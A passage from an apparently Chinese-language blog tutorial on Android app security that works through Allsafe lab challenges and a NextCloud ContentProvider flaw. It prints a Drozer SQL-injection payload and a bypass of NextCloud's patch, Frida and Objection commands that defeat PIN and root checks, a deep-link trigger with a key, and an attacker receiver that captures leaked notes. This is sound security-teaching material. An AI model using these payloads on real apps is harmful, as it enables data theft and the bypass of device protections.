class="meta">@NonNull</span> Uri uri, <span class="meta">@Nullable</span> String[] projection, <span class="meta">@Nullable</span> String selection, <span class="meta">@Nullable</span> String[] selectionArgs, <span class="meta">@Nullable</span> String sortOrder)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> mySQLiteOpenHelper.getReadableDatabase().query(<span class="string">&quot;user&quot;</span>,projection,selection,selectionArgs,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySQLiteOpenHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;</span><br><span class="line">        db.execSQL(<span class="string">&quot;create table user (id integer primary key autoincrement, name text, pass text);&quot;</span>);</span><br><span class="line">        db.execSQL(<span class="string">&quot;insert into user (name, pass) values (&#x27;user1&#x27;, &#x27;test&#x27;);&quot;</span>);</span><br><span class="line">        db.execSQL(<span class="string">&quot;insert into user (name, pass) values (&#x27;user2&#x27;, &#x27;test&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后需要在AndroidManifest.xml注册：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:authorities</span>=<span class="string">&quot;com.example.demo.provider&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>



<p>在其他应用中相应的读取数据的代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getContentResolver();</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(</span><br><span class="line">        Uri.parse(<span class="string">&quot;content://com.example.demo.provider/user&quot;</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;id&quot;</span>,<span class="string">&quot;name&quot;</span>&#125;,	<span class="comment">//Projection</span></span><br><span class="line">        <span class="string">&quot;id = ?&quot;</span>,										<span class="comment">//Selection</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;2&quot;</span>&#125;,</span><br><span class="line">        <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>Android 11以上还需要在AndroidManifest.xml声明以下权限：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">&quot;&lt;ContentProvider应用包名&gt;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h5 id="漏洞分析与修复绕过"><a href="#漏洞分析与修复绕过" class="headerlink" title="漏洞分析与修复绕过"></a>漏洞分析与修复绕过</h5><p>回到NextCloud中来，通过AndroidManifest.xml文件可知对应的代码在com.owncloud.android.providers.FileContentProvider</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219230857489.png" class="" title="image-20241219230857489">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219230954846.png" class="" title="image-20241219230954846">



<p>FileContentProvider的query中对于传入的projection和selection会直接进入最终的查询操作：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219231741942.png" class="" title="image-20241219231741942">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219231830945.png" class="" title="image-20241219231830945">

<p>而按照这里的代码逻辑Projection和Selection其实是会直接拼接到最终的SQL语句的，所以就造成了SQL注入。</p>
<p>可以继续用Drozer注入获取其他数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://org.nextcloud/ --projection &quot;name FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;-- &quot;</span><br></pre></td></tr></table></figure>

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219233550461.png" class="" title="image-20241219233550461">



<p>NextCloud修复方式：<a target="_blank" rel="noopener" href="https://github.com/nextcloud/android/pull/1820/files">https://github.com/nextcloud/android/pull/1820/files</a></p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219235751590.png" class="" title="image-20241219235751590">

<p>当<code>mUriMatcher.match(uri) == ROOT_DIRECTORY</code>时使用SQLiteQueryBuilder.setProjectionMap()，其实就相当于给Projection的可选值设置了白名单。当<code>selectionArgs</code>为null时，直接让Selection为<code>(?)</code>。但其实这两处的修复都不严谨，都可以绕过。</p>
<p>下载离漏洞版本最近的一次修复版：<a target="_blank" rel="noopener" href="https://download.nextcloud.com/android/nextcloud-30000001.apk">https://download.nextcloud.com/android/nextcloud-30000001.apk</a></p>
<p>可见已经不能随意输入Projection了：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220002308647.png" class="" title="image-20241220002308647">

<p>但更改一下URI便可以绕过：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220002431870.png" class="" title="image-20241220002431870">



<h3 id="PIN-Bypass"><a href="#PIN-Bypass" class="headerlink" title="PIN Bypass"></a>PIN Bypass</h3><blockquote>
<p>As you can see, there’s a simple PIN code validation below. Locate the method in the code and use Frida to override the return value. You can even brute-force the code because it’s only 4 digit.</p>
</blockquote>
<p>一般可以根据错误提示来定位代码位置：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220131919496.png" class="" title="image-20241220131919496">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220131957863.png" class="" title="image-20241220131957863">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220132051218.png" class="" title="image-20241220132051218">

<p>Hook<code>checkPin</code>方法即可，Frida代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">PinBypass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;infosecadventures.allsafe.challenges.PinBypass&quot;</span>);</span><br><span class="line">    <span class="title class_">PinBypass</span>.<span class="property">checkPin</span>.<span class="property">implementation</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// frida -U -f infosecadventures.allsafe -l pin_bypass.js</span></span><br></pre></td></tr></table></figure>



<p>或者直接使用Objection：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g infosecadventures.allsafe explore --startup-command &quot;android hooking set return_value infosecadventures.allsafe.challenges.PinBypass.checkPin true&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Root-Detection"><a href="#Root-Detection" class="headerlink" title="Root Detection"></a>Root Detection</h3><blockquote>
<p>In this case, we’re using the RootBeer library to detect wether the device is rooted or not. Your task is to use Frida and bypass the root check. Good luck!</p>
</blockquote>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241220140920524.png" class="" title="image-20241220140920524">

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g infosecadventures.allsafe explore --startup-command &quot;android hooking set return_value com.scottyab.rootbeer.RootBeer.isRooted false&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Deep-Link-Exploitation"><a href="#Deep-Link-Exploitation" class="headerlink" title="Deep Link Exploitation"></a>Deep Link Exploitation</h3><blockquote>
<p>The challange here is simple. Find the deep link in the application and try to trigger it. You can do it with a HTML file pushed to the device or you can use the ADB tool. To make things a little bit harder, you have to provide a parameter to complete the task.</p>
</blockquote>
<h4 id="Deep-Link介绍"><a href="#Deep-Link介绍" class="headerlink" title="Deep Link介绍"></a>Deep Link介绍</h4><p>根据<a target="_blank" rel="noopener" href="https://developer.android.com/training/app-links">官方文档</a>和<a target="_blank" rel="noopener" href="https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-II">一些资料</a>可知，Deep Link就是通过特定链接可以让用户在浏览器或其他应用直接跳转到指定应用中的某一个页面的技术。</p>
<p>比如想要通过自定义URL跳转到MyActivity需要在AndroidManifest.xml进行如下配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyActivity&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:scheme</span>=<span class="string">&quot;demo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了响应系统跳转的意图动作，Action需要指定为<code>android.intent.action.VIEW</code>；Category中添加了<code>android.intent.category.DEFAULT</code>来响应隐式意图（没有明确指定目标组件，而是通过动作和数据等信息来匹配组件），<code>android.intent.category.BROWSABLE</code>表示Activity可以从浏览器中启动；Data中的scheme必须指定，还可以指定host，path等。</p>
<p>这样便可以在浏览器网页中通过以下链接跳转到该Activity：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;demo://anything/anything&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者通过ADB跳转：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -a android.intent.action.VIEW -d &quot;demo://anything/anything&quot;</span><br></pre></td></tr></table></figure>



<p>在系统通过intent filter启动指定 Activity 后，可以从Intent中获取数据：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_my);</span><br><span class="line"></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">    <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> intent.getData();</span><br><span class="line">    <span class="keyword">if</span>(data!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">scheme</span> <span class="operator">=</span> data.getScheme();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> data.getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> data.getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> data.getQuery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Deep-Link风险"><a href="#Deep-Link风险" class="headerlink" title="Deep Link风险"></a>Deep Link风险</h4><p>我也看了很多相关资料，其实主要风险还是由于开发者没有对从Intent传来的数据做好校验就使用数据做进一步操作，导致可操纵WebView，数据泄露等问题。</p>
<p>靶场APK代码如下：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221112630553.png" class="" title="image-20241221112630553">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221112732067.png" class="" title="image-20241221112732067">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221113152339.png" class="" title="image-20241221113152339">

<p>构造如下链接即可：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -a android.intent.action.VIEW -d &quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;</span><br></pre></td></tr></table></figure>



<p>实际案例有 Deep Link跳转然后直接follow指定用户的类似CSRF的问题：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/583987">https://hackerone.com/reports/583987</a> ； 控制Webview打开任意URL导致敏感信息泄漏的问题：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/401793">https://hackerone.com/reports/401793</a></p>
<h3 id="Insecure-Broadcast-Receiver"><a href="#Insecure-Broadcast-Receiver" class="headerlink" title="Insecure Broadcast Receiver"></a>Insecure Broadcast Receiver</h3><blockquote>
<p>Our intern wrote a simple note taking feature into the app but the data processing logic seems weird. Gideon got some reports about critical vulnerabilities being exploited… As far as I know, hackers were able to capture the notes and exploit a permission re-delegation vulnerability. Can you check this madness out and maybe write a PoC for demonstration?</p>
</blockquote>
<h4 id="Broadcast-Receiver介绍"><a href="#Broadcast-Receiver介绍" class="headerlink" title="Broadcast Receiver介绍"></a>Broadcast Receiver介绍</h4><p>Broadcast Receiver是Android四大组件之一，是一种广泛运用在应用程序之间传输信息的机制，通过发送Intent来传送我们的数据。应用可以注册接收特定的广播。广播发出后，系统会自动将广播传送给同意接收这种广播的应用。</p>
<p>通过继承BroadcastReceiver实现自己的广播接收器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">      	Log.d(TAG,intent.getAction());</span><br><span class="line">        Toast.makeText(context,intent.getAction(),Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册广播接收器有两种方式：动态注册和静态注册。</p>
<p>动态注册即通过代码注册，当系统销毁相应上下文时，注册也会失效，例如在Activity上下文中注册，只要activity保持活跃状态，就会收到广播，注册代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> MyBroadcastReceiver myBroadcastReceiver;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;UnspecifiedRegisterReceiverFlag&quot;)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        myBroadcastReceiver = <span class="keyword">new</span> <span class="title class_">MyBroadcastReceiver</span>();</span><br><span class="line">        <span class="type">IntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        intentFilter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">        registerReceiver(myBroadcastReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onPause();</span><br><span class="line">        unregisterReceiver(myBroadcastReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态注册需要在AndroidManifest.xml文件中配置，如果应用未运行，系统会在广播发出后启动应用（Android8.0之后静态注册无法接收隐式广播）：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>按发送顺序广播可以分为两类：</p>
<ul>
<li>标准广播：sendBroadcast(Intent)，完全异步执行的广播，会按随机的顺序向所有接收器发送广播</li>
<li>有序广播：sendOrderedBroadcast(Intent, String)，一次向一个接收器发送广播，当接收器逐个顺序执行时，可以向下传递结果，也可以中止广播，可以通过intent-filter的android:priority属性控制接收器的顺序</li>
</ul>
<h4 id="Broadcast-Receiver风险"><a href="#Broadcast-Receiver风险" class="headerlink" title="Broadcast Receiver风险"></a>Broadcast Receiver风险</h4><p>先来看靶场APK：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221162014262.png" class="" title="image-20241221162014262">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221162616770.png" class="" title="image-20241221162616770">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221164633354.png" class="" title="image-20241221164633354">

<p>注意其中的以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PackageManager</span> <span class="variable">packageManager</span> <span class="operator">=</span> requireActivity().getPackageManager();</span><br><span class="line">List&lt;ResolveInfo&gt; resolveInfos = packageManager.queryBroadcastReceivers(intent, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (ResolveInfo info : resolveInfos) &#123;</span><br><span class="line">    <span class="type">ComponentName</span> <span class="variable">cn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(info.activityInfo.packageName, info.activityInfo.name);</span><br><span class="line">    intent.setComponent(cn);</span><br><span class="line">    requireActivity().sendBroadcast(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码查找了能够接收特定Intent的Broadcast Receiver，然后显式地为广播指定这些Receiver，并逐个发送显式广播，并且靶场APK的AndroidManifest.xml文件中配置了以下权限：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么只要攻击者也注册满足条件的Broadcast Receiver，这段代码就会向攻击者发送广播，从而导致敏感数据泄漏，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Log.d(TAG,intent.getAction());</span><br><span class="line">        <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span>))&#123;</span><br><span class="line">            Log.d(TAG,intent.getStringExtra(<span class="string">&quot;note&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>另外靶场APK还有个问题就是任意应用可以向其发送广播，来伪造通知，代码如下（Android8.0之后静态注册无法接收隐式广播，所以这里只能发送显式广播）：</p>
